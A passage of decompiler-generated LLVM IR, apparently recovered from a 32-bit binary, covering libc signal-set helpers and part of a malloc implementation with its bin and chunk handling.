  uselistorder label %dec_label_pc_805ebbb, { 1, 0 }
}

define i32 @__sigismember(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v1_805ebd2 = add i32 %arg2, -1
  %v1_805ebd5 = urem i32 %v1_805ebd2, 32
  %v2_805ebd5 = icmp eq i32 %v1_805ebd5, 0
  store i32 %v1_805ebd5, i32* @ecx, align 4
  %v2_805ebd8 = udiv i32 %v1_805ebd2, 32
  br i1 %v2_805ebd5, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805ebdb = shl i32 1, %v1_805ebd5
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805ebdd = phi i32 [ 1, %entry ], [ %v5_805ebdb, %bb ]
  %v2_805ebdd = mul nuw nsw i32 %v2_805ebd8, 4
  %v3_805ebdd = add i32 %v2_805ebdd, %arg1
  %v4_805ebdd = inttoptr i32 %v3_805ebdd to i32*
  %v5_805ebdd = load i32, i32* %v4_805ebdd, align 4
  %v7_805ebdd = and i32 %v5_805ebdd, %v6_805ebdd
  %v8_805ebdd = icmp eq i32 %v7_805ebdd, 0
  %v1_805ebe1 = icmp eq i1 %v8_805ebdd, false
  %v2_805ebe1 = zext i1 %v1_805ebe1 to i32
  ret i32 %v2_805ebe1

; uselistorder directives
  uselistorder i32 %v1_805ebd5, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigaddset(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_805ebe8 = load i32, i32* @ebx, align 4
  store i32 %v0_805ebe8, i32* %stack_var_-4, align 4
  %v1_805ebf6 = add i32 %arg2, -1
  %v1_805ebf9 = urem i32 %v1_805ebf6, 32
  %v2_805ebf9 = icmp eq i32 %v1_805ebf9, 0
  store i32 %v1_805ebf9, i32* @ecx, align 4
  %v2_805ebfc = udiv i32 %v1_805ebf6, 32
  store i32 %v2_805ebfc, i32* @edx, align 4
  br i1 %v2_805ebf9, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v5_805ebff = shl i32 1, %v1_805ebf9
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805ec01 = phi i32 [ 1, %entry ], [ %v5_805ebff, %bb ]
  %v2_805ec01 = mul nuw nsw i32 %v2_805ebfc, 4
  %v3_805ec01 = add i32 %v2_805ec01, %arg1
  %v4_805ec01 = inttoptr i32 %v3_805ec01 to i32*
  %v5_805ec01 = load i32, i32* %v4_805ec01, align 4
  %v7_805ec01 = or i32 %v5_805ec01, %v6_805ec01
  store i32 %v7_805ec01, i32* %v4_805ec01, align 4
  %v2_805ec06 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ec06, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_805ebfc, { 1, 0 }
  uselistorder i32 %v1_805ebf9, { 2, 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__sigdelset() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_805ec08 = load i32, i32* @ebx, align 4
  store i32 %v0_805ec08, i32* %stack_var_-4, align 4
  %v1_805ec16 = add i32 %tmp2, -1
  %v1_805ec19 = urem i32 %v1_805ec16, 32
  %v2_805ec19 = icmp eq i32 %v1_805ec19, 0
  %v2_805ec1c = udiv i32 %v1_805ec16, 32
  br i1 %v2_805ec19, label %bb5, label %bb

bb:                                               ; preds = %entry
  %v4_805ec1f = shl i32 -2, %v1_805ec19
  %v5_805ec1f = sub nsw i32 32, %v1_805ec19
  %v6_805ec1f = lshr i32 -2, %v5_805ec1f
  %v7_805ec1f = or i32 %v6_805ec1f, %v4_805ec1f
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v6_805ec21 = phi i32 [ -2, %entry ], [ %v7_805ec1f, %bb ]
  %v2_805ec21 = mul nuw nsw i32 %v2_805ec1c, 4
  %v3_805ec21 = add i32 %v2_805ec21, %tmp
  %v4_805ec21 = inttoptr i32 %v3_805ec21 to i32*
  %v5_805ec21 = load i32, i32* %v4_805ec21, align 4
  %v7_805ec21 = and i32 %v5_805ec21, %v6_805ec21
  store i32 %v7_805ec21, i32* %v4_805ec21, align 4
  %v2_805ec26 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805ec26, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_805ec19, { 1, 2, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__malloc_largebin_index() local_unnamed_addr {
entry:
  %v0_805ec28 = load i32, i32* @eax, align 4
  %v6_805ec3b = icmp ugt i32 %v0_805ec28, 16777215
  br i1 %v6_805ec3b, label %dec_label_pc_805ec4c, label %dec_label_pc_805ec3d

dec_label_pc_805ec3d:                             ; preds = %entry
  %tmp = icmp ult i32 %v0_805ec28, 256
  %v2_805ec2b = udiv i32 %v0_805ec28, 256
  %v2_805ec3d = call i32 @llvm.ctlz.i32(i32 %v2_805ec2b, i1 true)
  %v3_805ec3d = xor i32 %v2_805ec3d, 31
  %v5_805ec3d = select i1 %tmp, i32 95, i32 %v3_805ec3d
  %v1_805ec40 = add nuw nsw i32 %v5_805ec3d, 6
  store i32 %v1_805ec40, i32* @ecx, align 4
  %v2_805ec43 = urem i32 %v1_805ec40, 32
  %v4_805ec43 = icmp eq i32 %v2_805ec43, 0
  br i1 %v4_805ec43, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_805ec3d
  %v5_805ec43 = lshr i32 %v0_805ec28, %v2_805ec43
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_805ec3d, %bb
  %v0_805ec45 = phi i32 [ %v0_805ec28, %dec_label_pc_805ec3d ], [ %v5_805ec43, %bb ]
  %v1_805ec45 = urem i32 %v0_805ec45, 4
  %v2_805ec48 = mul nuw nsw i32 %v5_805ec3d, 4
  %v3_805ec48 = or i32 %v1_805ec45, 32
  %v4_805ec48 = add nuw nsw i32 %v3_805ec48, %v2_805ec48
  br label %dec_label_pc_805ec4c

dec_label_pc_805ec4c:                             ; preds = %entry, %bb4
  %v0_805ec4d = phi i32 [ 95, %entry ], [ %v4_805ec48, %bb4 ]
  ret i32 %v0_805ec4d

; uselistorder directives
  uselistorder i32 %v2_805ec43, { 1, 0 }
  uselistorder i32 %v0_805ec28, { 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_805ec4c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @malloc(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805ec4e = load i32, i32* @ebp, align 4
  %v0_805ec4f = load i32, i32* @edi, align 4
  %v0_805ec50 = load i32, i32* @esi, align 4
  %v0_805ec51 = load i32, i32* @ebx, align 4
  store i32 %v0_805ec51, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_805ec63 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805ec63, i32* %eax.global-to-local, align 4
  store i32 %v2_805ec63, i32* %stack_var_-92, align 4
  %v4_805ec68 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134583465, i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v4_805ec68, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8073eb0.683 to i32), i32* %stack_var_-92, align 4
  %v1_805ec74 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8073eb0.683 to i32))
  store i32 %v1_805ec74, i32* %eax.global-to-local, align 4
  %v0_805ec7c = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805ec7c, -32
  br i1 %tmp, label %dec_label_pc_805ec93, label %dec_label_pc_805ec81

dec_label_pc_805ec81:                             ; preds = %entry
  %v0_805ec81 = load i32, i32* %stack_var_-92, align 4
  %v1_805ec81 = call i32 @__errno_location(i32 %v0_805ec81)
  store i32 %v1_805ec81, i32* %eax.global-to-local, align 4
  store i32 0, i32* @ebx, align 4
  %v1_805ec88 = inttoptr i32 %v1_805ec81 to i32*
  store i32 12, i32* %v1_805ec88, align 4
  br label %dec_label_pc_805f3b8

dec_label_pc_805ec93:                             ; preds = %entry
  %v1_805ec93 = add i32 %v0_805ec7c, 11
  %tmp127 = icmp ult i32 %v1_805ec93, 16
  br i1 %tmp127, label %dec_label_pc_805ecaa, label %dec_label_pc_805eca3

dec_label_pc_805eca3:                             ; preds = %dec_label_pc_805ec93
  %v1_805eca3 = and i32 %v1_805ec93, -8
  br label %dec_label_pc_805ecaa

dec_label_pc_805ecaa:                             ; preds = %dec_label_pc_805ec93, %dec_label_pc_805eca3
  %storemerge131 = phi i32 [ %v1_805eca3, %dec_label_pc_805eca3 ], [ %v1_805ec93, %dec_label_pc_805ec93 ]
  %v1_805f042 = phi i32 [ %v1_805eca3, %dec_label_pc_805eca3 ], [ 16, %dec_label_pc_805ec93 ]
  store i32 %storemerge131, i32* %eax.global-to-local, align 4
  %v0_805ecaa = load i8, i8* @global_var_807e120.767, align 1
  %v1_805ecaa = sext i8 %v0_805ecaa to i32
  store i32 %v1_805ecaa, i32* @ebx, align 4
  %v3_805ecb0 = urem i8 %v0_805ecaa, 2
  %v4_805ecb0 = icmp eq i8 %v3_805ecb0, 0
  %v1_805ecb3 = icmp eq i1 %v4_805ecb0, false
  br i1 %v1_805ecb3, label %dec_label_pc_805ecd2, label %dec_label_pc_805ecb5

dec_label_pc_805ecb5:                             ; preds = %dec_label_pc_805ecaa
  %v2_805ecb5 = icmp eq i8 %v0_805ecaa, 0
  %v1_805ecb7 = icmp eq i1 %v2_805ecb5, false
  br i1 %v1_805ecb7, label %dec_label_pc_805efad, label %dec_label_pc_805ecbd

dec_label_pc_805ecbd:                             ; preds = %dec_label_pc_805ecb5
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* %stack_var_-92, align 4
  %v2_805ecc5 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e120.767 to i32*))
  store i32 %v2_805ecc5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805efad

dec_label_pc_805ecd2:                             ; preds = %dec_label_pc_805ecaa
  %v11_805ecd2 = trunc i32 %v1_805f042 to i8
  %v8_805ecd6 = icmp ugt i8 %v11_805ecd2, %v0_805ecaa
  br i1 %v8_805ecd6, label %dec_label_pc_805ecf3, label %dec_label_pc_805ecd8

dec_label_pc_805ecd8:                             ; preds = %dec_label_pc_805ecd2
  %v2_805ecdc = udiv i32 %v1_805f042, 2
  store i32 %v2_805ecdc, i32* %eax.global-to-local, align 4
  %v1_805ecde = add i32 %v2_805ecdc, ptrtoint (i8* @global_var_807e120.767 to i32)
  store i32 %v1_805ecde, i32* @ecx, align 4
  %v1_805ece4 = add i32 %v2_805ecdc, add (i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32 -4)
  %v2_805ece4 = inttoptr i32 %v1_805ece4 to i32*
  %v3_805ece4 = load i32, i32* %v2_805ece4, align 4
  store i32 %v3_805ece4, i32* %edx.global-to-local, align 4
  %v1_805ece7 = icmp eq i32 %v3_805ece4, 0
  br i1 %v1_805ece7, label %dec_label_pc_805ecf3, label %dec_label_pc_805eceb

dec_label_pc_805eceb:                             ; preds = %dec_label_pc_805ecd8
  %v1_805eceb = add i32 %v3_805ece4, 8
  %v2_805eceb = inttoptr i32 %v1_805eceb to i32*
  %v3_805eceb = load i32, i32* %v2_805eceb, align 4
  store i32 %v3_805eceb, i32* %eax.global-to-local, align 4
  store i32 %v3_805eceb, i32* %v2_805ece4, align 4
  br label %dec_label_pc_805ed2c

dec_label_pc_805ecf3:                             ; preds = %dec_label_pc_805ecd8, %dec_label_pc_805ecd2
  %v8_805ecf3 = icmp ult i32 %v1_805f042, 255
  %v6_805ecfb = icmp ugt i32 %v1_805f042, 255
  store i32 %v1_805f042, i32* @eax, align 4
  br i1 %v6_805ecfb, label %dec_label_pc_805ed34, label %dec_label_pc_805ecfd

dec_label_pc_805ecfd:                             ; preds = %dec_label_pc_805ecf3
  %v2_805ed01 = udiv i32 %v1_805f042, 8
  store i32 %v2_805ed01, i32* %eax.global-to-local, align 4
  %v1_805ed08 = mul nuw i32 %v2_805ed01, 8
  %v2_805ed08 = add i32 %v1_805ed08, ptrtoint (i32* @global_var_807e14c.768 to i32)
  store i32 %v2_805ed08, i32* @ecx, align 4
  %v1_805ed0f = add i32 %v1_805ed08, add (i32 ptrtoint (i32* @global_var_807e14c.768 to i32), i32 12)
  %v2_805ed0f = inttoptr i32 %v1_805ed0f to i32*
  %v3_805ed0f = load i32, i32* %v2_805ed0f, align 4
  store i32 %v3_805ed0f, i32* %edx.global-to-local, align 4
  %v12_805ed12 = icmp eq i32 %v3_805ed0f, %v2_805ed08
  br i1 %v12_805ed12, label %dec_label_pc_805ee30.preheader, label %dec_label_pc_805ed1a

dec_label_pc_805ed1a:                             ; preds = %dec_label_pc_805ecfd
  store i32 %v1_805f042, i32* %ebx.global-to-local, align 4
  %v1_805ed1e = add i32 %v3_805ed0f, 12
  %v2_805ed1e = inttoptr i32 %v1_805ed1e to i32*
  %v3_805ed1e = load i32, i32* %v2_805ed1e, align 4
  store i32 %v3_805ed1e, i32* %eax.global-to-local, align 4
  store i32 %v3_805ed1e, i32* %v2_805ed0f, align 4
  %v0_805ed24 = load i32, i32* %edx.global-to-local, align 4
  %v1_805ed24 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805ed24 = add i32 %v0_805ed24, 4
  %v3_805ed24 = add i32 %v2_805ed24, %v1_805ed24
  %v4_805ed24 = inttoptr i32 %v3_805ed24 to i32*
  %v5_805ed24 = load i32, i32* %v4_805ed24, align 4
  %v6_805ed24 = or i32 %v5_805ed24, 1
  store i32 %v6_805ed24, i32* %v4_805ed24, align 4
  %v0_805ed29 = load i32, i32* @ecx, align 4
  %v1_805ed29 = load i32, i32* %eax.global-to-local, align 4
  %v2_805ed29 = add i32 %v1_805ed29, 8
  %v3_805ed29 = inttoptr i32 %v2_805ed29 to i32*
  store i32 %v0_805ed29, i32* %v3_805ed29, align 4
  br label %dec_label_pc_805ed2c

dec_label_pc_805ed2c:                             ; preds = %dec_label_pc_805f0c9, %dec_label_pc_805f0db, %dec_label_pc_805eceb, %dec_label_pc_805ed1a
  %v0_805ed2c = load i32, i32* %edx.global-to-local, align 4
  %v1_805ed2c = add i32 %v0_805ed2c, 8
  store i32 %v1_805ed2c, i32* @ebx, align 4
  br label %dec_label_pc_805f3a7

dec_label_pc_805ed34:                             ; preds = %dec_label_pc_805ecf3
  %v0_805ed38 = call i32 @__malloc_largebin_index()
  store i32 %v0_805ed38, i32* %eax.global-to-local, align 4
  %v3_805ed3d = and i8 %v0_805ecaa, 2
  %v4_805ed3d = icmp eq i8 %v3_805ed3d, 0
  %v6_805ed3d = zext i8 %v3_805ed3d to i32
  %v9_805ed3d = and i32 %v1_805ecaa, -256
  %v10_805ed3d = or i32 %v9_805ed3d, %v6_805ed3d
  store i32 %v10_805ed3d, i32* @ebx, align 4
  br i1 %v4_805ed3d, label %dec_label_pc_805ee30.preheader, label %dec_label_pc_805ed4a

dec_label_pc_805ed4a:                             ; preds = %dec_label_pc_805ed34
  store i32 ptrtoint (i8* @global_var_807e120.767 to i32), i32* %stack_var_-92, align 4
  %v2_805ed52 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_807e120.767 to i32*))
  store i32 %v2_805ed52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee30.preheader

dec_label_pc_805ee30.preheader:                   ; preds = %dec_label_pc_805ed4a, %dec_label_pc_805ecfd, %dec_label_pc_805ed34
  %stack_var_-40.0.ph = phi i32 [ %v2_805ed01, %dec_label_pc_805ecfd ], [ %v0_805ed38, %dec_label_pc_805ed4a ], [ %v0_805ed38, %dec_label_pc_805ed34 ]
  %v1_805ed86 = add i32 %v1_805f042, 16
  %v0_805ee30106 = load i32, i32* @global_var_807e160.771, align 32
  store i32 %v0_805ee30106, i32* @ebp, align 4
  %v9_805ee36111 = icmp eq i32 %v0_805ee30106, 134734164
  %v1_805ee3c112 = icmp eq i1 %v9_805ee36111, false
  br i1 %v1_805ee3c112, label %dec_label_pc_805ed5f, label %dec_label_pc_805ee42

dec_label_pc_805ed5f:                             ; preds = %dec_label_pc_805ee30.preheader, %bb84
  %v0_805ee30113 = phi i32 [ %v0_805ee30, %bb84 ], [ %v0_805ee30106, %dec_label_pc_805ee30.preheader ]
  %v1_805ed5f = add i32 %v0_805ee30113, 4
  %v2_805ed5f = inttoptr i32 %v1_805ed5f to i32*
  %v3_805ed5f = load i32, i32* %v2_805ed5f, align 4
  %v1_805ed62 = add i32 %v0_805ee30113, 12
  %v2_805ed62 = inttoptr i32 %v1_805ed62 to i32*
  %v3_805ed62 = load i32, i32* %v2_805ed62, align 4
  store i32 %v3_805ed62, i32* %edx.global-to-local, align 4
  %v1_805ed65 = and i32 %v3_805ed5f, -4
  store i32 %v1_805ed65, i32* @edi, align 4
  br i1 %v6_805ecfb, label %dec_label_pc_805ed91, label %dec_label_pc_805ed72

dec_label_pc_805ed72:                             ; preds = %dec_label_pc_805ed5f
  %v9_805ed72 = icmp eq i32 %v3_805ed62, 134734164
  %v1_805ed78 = icmp eq i1 %v9_805ed72, false
  br i1 %v1_805ed78, label %dec_label_pc_805ed91, label %dec_label_pc_805ed7a

dec_label_pc_805ed7a:                             ; preds = %dec_label_pc_805ed72
  %v1_805ed7a = load i32, i32* @global_var_807e150.769, align 16
  %v12_805ed7a = icmp eq i32 %v0_805ee30113, %v1_805ed7a
  %v1_805ed80 = icmp eq i1 %v12_805ed7a, false
  br i1 %v1_805ed80, label %dec_label_pc_805ed91, label %dec_label_pc_805ed82

dec_label_pc_805ed82:                             ; preds = %dec_label_pc_805ed7a
  store i32 %v1_805ed86, i32* %eax.global-to-local, align 4
  %v6_805ed8b = icmp ugt i32 %v1_805ed65, %v1_805ed86
  br i1 %v6_805ed8b, label %dec_label_pc_805f342, label %dec_label_pc_805ed91

dec_label_pc_805ed91:                             ; preds = %dec_label_pc_805ed82, %dec_label_pc_805ed7a, %dec_label_pc_805ed72, %dec_label_pc_805ed5f
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %eax.global-to-local, align 4
  %v2_805ed96 = add i32 %v3_805ed62, 8
  %v3_805ed96 = inttoptr i32 %v2_805ed96 to i32*
  store i32 ptrtoint (i32* @global_var_807e154.770 to i32), i32* %v3_805ed96, align 4
  %v0_805ed99 = load i32, i32* %edx.global-to-local, align 4
  store i32 %v0_805ed99, i32* @global_var_807e160.771, align 4
  %v0_805ed9c = load i32, i32* @edi, align 4
  %v15_805ed9c = icmp eq i32 %v0_805ed9c, %v1_805f042
  br i1 %v15_805ed9c, label %dec_label_pc_805f383, label %dec_label_pc_805eda6

dec_label_pc_805eda6:                             ; preds = %dec_label_pc_805ed91
  %v6_805edac = icmp ugt i32 %v0_805ed9c, 255
  br i1 %v6_805edac, label %dec_label_pc_805edbf, label %dec_label_pc_805edae

dec_label_pc_805edae:                             ; preds = %dec_label_pc_805eda6
  %v2_805edb0 = udiv i32 %v0_805ed9c, 8
  store i32 %v2_805edb0, i32* %esi.global-to-local, align 4
  %v1_805edb3 = mul nuw i32 %v2_805edb0, 8
  %v2_805edb3 = add i32 %v1_805edb3, 134734156
  store i32 %v2_805edb3, i32* @ebx, align 4
  %v1_805edba = add i32 %v1_805edb3, 134734164
  %v2_805edba = inttoptr i32 %v1_805edba to i32*
  %v3_805edba = load i32, i32* %v2_805edba, align 4
  store i32 %v3_805edba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805ee08

dec_label_pc_805edbf:                             ; preds = %dec_label_pc_805eda6
  store i32 %v0_805ed9c, i32* @eax, align 4
  %v0_805edc1 = call i32 @__malloc_largebin_index()
  store i32 %v0_805edc1, i32* %esi.global-to-local, align 4
  %v1_805edc8 = mul i32 %v0_805edc1, 8
  %v2_805edc8 = add i32 %v1_805edc8, ptrtoint (i32* @global_var_807e14c.768 to i32)
  store i32 %v2_805edc8, i32* %eax.global-to-local, align 4
  %v1_805edcf = add i32 %v1_805edc8, add (i32 ptrtoint (i32* @global_var_807e14c.768 to i32), i32 8)
  %v2_805edcf = inttoptr i32 %v1_805edcf to i32*
  %v3_805edcf = load i32, i32* %v2_805edcf, align 4
  store i32 %v3_805edcf, i32* %edx.global-to-local, align 4
  store i32 %v3_805edcf, i32* @ebx, align 4
  %v12_805edd8 = icmp eq i32 %v3_805edcf, %v2_805edc8
  br i1 %v12_805edd8, label %dec_label_pc_805ee08, label %dec_label_pc_805eddc

dec_label_pc_805eddc:                             ; preds = %dec_label_pc_805edbf
  %v1_805eddc = add i32 %v1_805edc8, add (i32 ptrtoint (i32* @global_var_807e14c.768 to i32), i32 12)
  %v2_805eddc = inttoptr i32 %v1_805eddc to i32*
  %v3_805eddc = load i32, i32* %v2_805eddc, align 4
  store i32 %v3_805eddc, i32* @ebx, align 4
  %v0_805eddf = load i32, i32* @edi, align 4
  %v2_805eddf = add i32 %v3_805eddc, 4
  %v3_805eddf = inttoptr i32 %v2_805eddf to i32*
  %v4_805eddf = load i32, i32* %v3_805eddf, align 4
  %v10_805eddf = icmp ult i32 %v0_805eddf, %v4_805eddf
  %v1_805ede2 = icmp eq i1 %v10_805eddf, false
  br i1 %v1_805ede2, label %dec_label_pc_805edea, label %dec_label_pc_805ee08

dec_label_pc_805edea:                             ; preds = %dec_label_pc_805eddc
  %v1_805edec = or i32 %v0_805eddf, 1
  store i32 %v1_805edec, i32* %eax.global-to-local, align 4
  store i32 %v3_805edcf, i32* %ebx.global-to-local, align 4
  %v2_805ee0098 = add i32 %v3_805edcf, 4
  %v3_805ee0099 = inttoptr i32 %v2_805ee0098 to i32*
  %v4_805ee00100 = load i32, i32* %v3_805ee0099, align 4
  %v10_805ee00102 = icmp ult i32 %v1_805edec, %v4_805ee00100
  br i1 %v10_805ee00102, label %dec_label_pc_805edf1, label %dec_label_pc_805ee05

dec_label_pc_805edf1:                             ; preds = %dec_label_pc_805edea, %dec_label_pc_805edf1
  %v0_805ee05103 = phi i32 [ %v3_805edf5, %dec_label_pc_805edf1 ], [ %v3_805edcf, %dec_label_pc_805edea ]
  store i32 %v0_805ee05103, i32* %ecx.global-to-local, align 4
  %v1_805edf5 = add i32 %v0_805ee05103, 8
  %v2_805edf5 = inttoptr i32 %v1_805edf5 to i32*
  %v3_805edf5 = load i32, i32* %v2_805edf5, align 4
  store i32 %v3_805edf5, i32* %ecx.global-to-local, align 4
  store i32 %v3_805edf5, i32* %ebx.global-to-local, align 4
  %v2_805ee00 = add i32 %v3_805edf5, 4
  %v3_805ee00 = inttoptr i32 %v2_805ee00 to i32*
  %v4_805ee00 = load i32, i32* %v3_805ee00, align 4
  %v10_805ee00 = icmp ult i32 %v1_805edec, %v4_805ee00
  br i1 %v10_805ee00, label %dec_label_pc_805edf1, label %dec_label_pc_805ee05

dec_label_pc_805ee05:                             ; preds = %dec_label_pc_805edf1, %dec_label_pc_805edea
  %v0_805ee05.lcssa = phi i32 [ %v3_805edcf, %dec_label_pc_805edea ], [ %v3_805edf5, %dec_label_pc_805edf1 ]
  %v1_805ee05 = add i32 %v0_805ee05.lcssa, 12
  %v2_805ee05 = inttoptr i32 %v1_805ee05 to i32*
  %v3_805ee05 = load i32, i32* %v2_805ee05, align 4
  store i32 %v3_805ee05, i32* @ebx, align 4
  br label %dec_label_pc_805ee08

dec_label_pc_805ee08:                             ; preds = %dec_label_pc_805edae, %dec_label_pc_805eddc, %dec_label_pc_805edbf, %dec_label_pc_805ee05
  %v0_805ee08 = phi i32 [ %v0_805edc1, %dec_label_pc_805edbf ], [ %v0_805edc1, %dec_label_pc_805ee05 ], [ %v0_805edc1, %dec_label_pc_805eddc ], [ %v2_805edb0, %dec_label_pc_805edae ]
  %stack_var_-64.1 = phi i32 [ %v3_805edcf, %dec_label_pc_805edbf ], [ %v0_805ee05.lcssa, %dec_label_pc_805ee05 ], [ %v2_805edc8, %dec_label_pc_805eddc ], [ %v3_805edba, %dec_label_pc_805edae ]
  %v1_805ee0a = urem i32 %v0_805ee08, 32
  %v2_805ee0a = icmp eq i32 %v1_805ee0a, 0
  store i32 %v1_805ee0a, i32* %esi.global-to-local, align 4
  store i32 %v1_805ee0a, i32* @ecx, align 4
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_805ee14 = sdiv i32 %v0_805ee08, 32
  store i32 %v2_805ee14, i32* %edx.global-to-local, align 4
  br i1 %v2_805ee0a, label %bb84, label %bb

bb:                                               ; preds = %dec_label_pc_805ee08
  %v5_805ee17 = shl i32 1, %v1_805ee0a
  store i32 %v5_805ee17, i32* %eax.global-to-local, align 4
  br label %bb84

bb84:                                             ; preds = %dec_label_pc_805ee08, %bb
  %v5_805ee19 = phi i32 [ 1, %dec_label_pc_805ee08 ], [ %v5_805ee17, %bb ]
  %v1_805ee19 = mul nsw i32 %v2_805ee14, 4
  %v2_805ee19 = add i32 %v1_805ee19, ptrtoint (i32* @global_var_807e454.772 to i32)
  %v3_805ee19 = inttoptr i32 %v2_805ee19 to i32*
  %v4_805ee19 = load i32, i32* %v3_805ee19, align 4
  %v6_805ee19 = or i32 %v4_805ee19, %v5_805ee19
  store i32 %v6_805ee19, i32* %v3_805ee19, align 4
  %v0_805ee20 = load i32, i32* @ebx, align 4
  %v1_805ee20 = load i32, i32* @ebp, align 4
  %v2_805ee20 = add i32 %v1_805ee20, 12
  %v3_805ee20 = inttoptr i32 %v2_805ee20 to i32*
  store i32 %v0_805ee20, i32* %v3_805ee20, align 4
  store i32 %stack_var_-64.1, i32* @esi, align 4
  %v1_805ee27 = load i32, i32* @ebp, align 4
  %v2_805ee27 = add i32 %v1_805ee27, 8
  %v3_805ee27 = inttoptr i32 %v2_805ee27 to i32*
  store i32 %stack_var_-64.1, i32* %v3_805ee27, align 4
  %v0_805ee2a = load i32, i32* @ebp, align 4
  %v1_805ee2a = load i32, i32* @ebx, align 4
  %v2_805ee2a = add i32 %v1_805ee2a, 8
  %v3_805ee2a = inttoptr i32 %v2_805ee2a to i32*
  store i32 %v0_805ee2a, i32* %v3_805ee2a, align 4
  %v0_805ee2d = load i32, i32* @ebp, align 4
  %v1_805ee2d = load i32, i32* @esi, align 4
  %v2_805ee2d = add i32 %v1_805ee2d, 12
  %v3_805ee2d = inttoptr i32 %v2_805ee2d to i32*
  store i32 %v0_805ee2d, i32* %v3_805ee2d, align 4
  %v0_805ee30 = load i32, i32* @global_var_807e160.771, align 32
  store i32 %v0_805ee30, i32* @ebp, align 4
  %v9_805ee36 = icmp eq i32 %v0_805ee30, 134734164
  %v1_805ee3c = icmp eq i1 %v9_805ee36, false
  br i1 %v1_805ee3c, label %dec_label_pc_805ed5f, label %dec_label_pc_805ee42

dec_label_pc_805ee42:                             ; preds = %bb84, %dec_label_pc_805ee30.preheader
  br i1 %v8_805ecf3, label %dec_label_pc_805eed0, label %dec_label_pc_805ee50

dec_label_pc_805ee50:                             ; preds = %dec_label_pc_805ee42
  store i32 %stack_var_-40.0.ph, i32* %eax.global-to-local, align 4
  %v1_805ee54 = mul i32 %stack_var_-40.0.ph, 8
  %v2_805ee54 = add i32 %v1_805ee54, ptrtoint (i32* @global_var_807e14c.768 to i32)
  store i32 %v2_805ee54, i32* %edx.global-to-local, align 4
  %v1_805ee5b = add i32 %v1_805ee54, add (i32 ptrtoint (i32* @global_var_807e14c.768 to i32), i32 12)
  %v2_805ee5b = inttoptr i32 %v1_805ee5b to i32*
  %storemerge1.pre = load i32, i32* %v2_805ee5b, align 4
  br label %dec_label_pc_805eecc

dec_label_pc_805ee60:                             ; preds = %dec_label_pc_805eecc
  %v1_805ee60 = add i32 %v4_805ee77, 4
  %v2_805ee60 = inttoptr i32 %v1_805ee60 to i32*
  %v3_805ee60 = load i32, i32* %v2_805ee60, align 4
  store i32 %v3_805ee60, i32* %ebx.global-to-local, align 4
  %v1_805ee63 = add i32 %v4_805ee77, 12
  %v2_805ee63 = inttoptr i32 %v1_805ee63 to i32*
  %v3_805ee63 = load i32, i32* %v2_805ee63, align 4
  store i32 %v3_805ee63, i32* @ecx, align 4
  %v1_805ee66 = and i32 %v3_805ee60, -4
  store i32 %v1_805ee66, i32* @ebx, align 4
  %v10_805ee69 = icmp ult i32 %v1_805ee66, %v1_805f042
  br i1 %v10_805ee69, label %dec_label_pc_805eecc, label %dec_label_pc_805ee6f

dec_label_pc_805ee6f:                             ; preds = %dec_label_pc_805ee60
  %v1_805ee6f = add i32 %v4_805ee77, 8
  %v2_805ee6f = inttoptr i32 %v1_805ee6f to i32*
  %v3_805ee6f = load i32, i32* %v2_805ee6f, align 4
  store i32 %v3_805ee6f, i32* @edx, align 4
  %v1_805ee72 = add i32 %v3_805ee6f, 12
  %v2_805ee72 = inttoptr i32 %v1_805ee72 to i32*
  %v3_805ee72 = load i32, i32* %v2_805ee72, align 4
  %v15_805ee72 = icmp eq i32 %v3_805ee72, %v4_805ee77
  %v1_805ee75 = icmp eq i1 %v15_805ee72, false
  br i1 %v1_805ee75, label %dec_label_pc_805ee7c, label %dec_label_pc_805ee77

dec_label_pc_805ee77:                             ; preds = %dec_label_pc_805ee6f
  %v1_805ee77 = add i32 %v3_805ee63, 8
